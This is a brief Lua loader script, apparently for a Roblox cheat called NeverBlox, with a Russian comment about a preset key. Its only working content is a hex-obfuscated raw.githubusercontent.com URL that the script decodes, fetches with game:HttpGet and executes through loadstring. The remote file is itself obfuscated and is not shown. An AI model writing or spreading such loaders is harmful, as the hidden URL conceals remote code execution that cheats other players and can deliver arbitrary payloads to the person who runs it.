-- NeverBlox loader (hex-obfuscated redirect) --
-- getgenv().Key уже задан вызывающим лоадером — не трогаем, просто тянем скрипт
local _=function(h) local r="" for i=1,#h,2 do r=r..string.char(tonumber(h:sub(i,i+1),16)) end return r end
loadstring(game:HttpGet(_("68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f53796e6356616c6f72616e743132332f35326b6f756e746572626c6f782f726566732f68656164732f6d61696e2f4e65766572426c6f785f6f6266757363617465642532302832292e6c7561")))()
